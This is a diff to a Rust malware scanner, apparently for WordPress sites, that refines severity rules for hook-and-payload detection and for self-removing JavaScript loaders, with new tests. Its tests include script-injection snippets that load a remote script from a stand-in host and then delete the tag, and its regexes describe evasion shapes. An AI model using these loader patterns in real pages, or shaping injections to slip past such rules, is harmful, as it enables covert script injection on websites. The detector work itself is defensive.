@@ -81,19 +81,21 @@ struct Rule {
 /// A second look at each match, for what one pattern can't say.
 #[derive(Clone, Copy)]
 enum Guard {
-    /// This must match within [`NEAR_BYTES`] of it.
+    /// This must match in the same file: within [`NEAR_BYTES`] the rule's own
+    /// severity, further away Medium.
     Near(&'static str),
     /// This must not match inside it.
     Unless(&'static str),
 }
 
-/// How far a hook and its payload can be apart. A long literal elsewhere in a big
-/// file is that file's business: wordfence has one 177 kB from its `wp_head` hook.
+/// How far a hook and its payload can be apart to be High. Wordfence has a long
+/// literal 177 kB from its `wp_head` hook; that is worth a look, not an alarm.
 const NEAR_BYTES: usize = 8 * 1024;
 
-/// The script is added and a cleanup function is what comes next: React's
-/// `useEffect` idiom, which removes the tag when the component goes away.
-const CLEANUP_AFTER_APPEND: &str = r"(?-u)appendChild\s*\([^)]{0,64}\)\s*[,;]?\s*(?:return\s*)?(?:\(\s*\)\s*=>|function\s*\(\s*\))";
+/// The script is added and the removal sits in the body of the cleanup function
+/// that comes next: React's `useEffect` idiom, which removes the tag when the
+/// component goes away. A removal outside such a body is not exempt.
+const CLEANUP_AFTER_APPEND: &str = r"(?-u)appendChild\s*\([^)]{0,64}\)\s*[,;]?\s*(?:return\s*)?(?:\(\s*\)\s*=>|function\s*\(\s*\))\s*\{[^};]{0,200}?(?:removeChild\s*\(|\.remove\s*\(\s*\))";
 
 /// An encoded string literal over about 3 kB. A `data:` URI never matches: the
 /// run of base64 starts after a comma, not after the opening quote.
@@ -316,7 +318,7 @@ fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
 
     // Match positions per rule, High rules first, bounded by MAX_HITS each.
     let pack = &*PACK;
-    let mut found: Vec<(&Compiled, Vec<(usize, usize)>)> = Vec::new();
+    let mut found: Vec<(&Compiled, Vec<(usize, usize, Severity)>)> = Vec::new();
     let mut first_start: Option<usize> = None;
     for idx in pack.set.matches(body).iter() {
         let c = &pack.rules[idx];
@@ -335,18 +337,29 @@ fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
             }
             _ => Vec::new(),
         };
-        let spans: Vec<(usize, usize)> =
+        let spans: Vec<(usize, usize, Severity)> =
             c.re.find_iter(body)
-                .filter(|m| match &c.guard {
-                    None => true,
-                    Some((Guard::Near(_), _)) => near.iter().any(|(s, e)| {
-                        *s <= m.end().saturating_add(NEAR_BYTES)
-                            && *e >= m.start().saturating_sub(NEAR_BYTES)
-                    }),
-                    Some((Guard::Unless(_), re)) => !re.is_match(m.as_bytes()),
+                .filter_map(|m| {
+                    let severity = match &c.guard {
+                        None => c.rule.severity,
+                        Some((Guard::Near(_), _)) if near.is_empty() => return None,
+                        Some((Guard::Near(_), _)) => {
+                            let close = near.iter().any(|(s, e)| {
+                                *s <= m.end().saturating_add(NEAR_BYTES)
+                                    && *e >= m.start().saturating_sub(NEAR_BYTES)
+                            });
+                            if close {
+                                c.rule.severity
+                            } else {
+                                Severity::Medium
+                            }
+                        }
+                        Some((Guard::Unless(_), re)) if re.is_match(m.as_bytes()) => return None,
+                        Some((Guard::Unless(_), _)) => c.rule.severity,
+                    };
+                    Some((m.start(), m.end(), severity))
                 })
                 .take(MAX_HITS)
-                .map(|m| (m.start(), m.end()))
                 .collect();
         if spans.is_empty() {
             continue;
@@ -369,9 +382,9 @@ fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
     'fill: while hits.len() < MAX_HITS {
         let mut any = false;
         for (c, spans) in &found {
-            if let Some(&(start, end)) = spans.get(round) {
+            if let Some(&(start, end, severity)) = spans.get(round) {
                 any = true;
-                hits.push(make_hit(pack, c.rule, body, start, end));
+                hits.push(make_hit(pack, c.rule, severity, body, start, end));
                 if hits.len() >= MAX_HITS {
                     break 'fill;
                 }
@@ -397,7 +410,14 @@ fn path_hit(rule_id: &'static str, severity: Severity, text: &str) -> RuleHit {
     }
 }
 
-fn make_hit(pack: &Pack, rule: &Rule, body: &[u8], start: usize, end: usize) -> RuleHit {
+fn make_hit(
+    pack: &Pack,
+    rule: &Rule,
+    severity: Severity,
+    body: &[u8],
+    start: usize,
+    end: usize,
+) -> RuleHit {
     let line_start = body[..start]
         .iter()
         .rposition(|&b| b == b'\n')
@@ -413,7 +433,7 @@ fn make_hit(pack: &Pack, rule: &Rule, body: &[u8], start: usize, end: usize) -> 
     let snip_end = line_end.min(start + SNIPPET_CHARS * 4);
     RuleHit {
         rule_id: rule.id,
-        severity: rule.severity,
+        severity,
         line: line_of(body, start),
         domains: domains(&pack.url, &body[lo..hi]),
         snippet: clean(&body[start..snip_end]),
@@ -803,17 +823,28 @@ mod tests {
     }
 
     /// Real shape: wordfence's `wordfenceClass.php` hooks `wp_head` at byte 60054
-    /// and holds a 258-byte character set at byte 236931.
+    /// and holds a 258-byte character set at byte 236931. Far apart it is worth a
+    /// look, never High: a first scan would otherwise alarm on it, and with no hit
+    /// at all a payload padded away from its hook would be baselined unseen.
     #[test]
-    fn a_hook_far_from_a_long_literal_is_not_a_payload() {
+    fn a_hook_far_from_a_literal_is_medium_not_high() {
         let literal = "A".repeat(258);
         let filler = "// ordinary code\n".repeat(2000);
-        let far = format!("<?php\nadd_action('wp_head','x');\n{filler}$c='{literal}';\n");
-        let h = inspect("wp-content/plugins/p/p.php", far.as_bytes());
-        assert!(!ids(&h).contains(&"footer_hook_payload"), "{h:?}");
-        let far = format!("<?php\n$c='{literal}';\n{filler}add_action('wp_head','x');\n");
-        let h = inspect("wp-content/plugins/p/p.php", far.as_bytes());
-        assert!(!ids(&h).contains(&"footer_hook_payload"), "{h:?}");
+        for far in [
+            format!("<?php\nadd_action('wp_head','x');\n{filler}$c='{literal}';\n"),
+            format!("<?php\n$c='{literal}';\n{filler}add_action('wp_head','x');\n"),
+        ] {
+            let h = inspect("wp-content/plugins/p/p.php", far.as_bytes());
+            let hit = h
+                .iter()
+                .find(|h| h.rule_id == "footer_hook_payload")
+                .unwrap_or_else(|| panic!("no hit: {h:?}"));
+            assert_eq!(hit.severity, Severity::Medium, "{h:?}");
+            assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
+        }
+        // A hook with no payload anywhere is ordinary code.
+        let plain = format!("<?php\nadd_action('wp_head','x');\n{filler}");
+        assert!(inspect("wp-content/plugins/p/p.php", plain.as_bytes()).is_empty());
     }
 
     #[test]
@@ -848,6 +879,24 @@ return () => {
             let h = inspect("a.js", src);
             assert!(!ids(&h).contains(&"js_self_removing_loader"), "{h:?}");
             assert!(ids(&h).contains(&"js_remote_script"), "{h:?}");
+        }
+    }
+
+    /// An imitation of the cleanup shape, with the removal outside any function
+    /// body, is still the incident's behaviour.
+    #[test]
+    fn a_cleanup_imitation_outside_a_function_stays_high() {
+        for src in [
+            &br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s),()=>0;s.remove();"#[..],
+            br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s),()=>{};s.remove();"#,
+            br#"var s=document.createElement('script');s.src='https://x.example/a.js';document.head.appendChild(s);function(){return 0};s.parentNode.removeChild(s);"#,
+        ] {
+            let h = inspect("a.js", src);
+            let hit = h
+                .iter()
+                .find(|h| h.rule_id == "js_self_removing_loader")
+                .unwrap_or_else(|| panic!("no hit: {h:?}"));
+            assert_eq!(hit.severity, Severity::High);
         }
     }
 
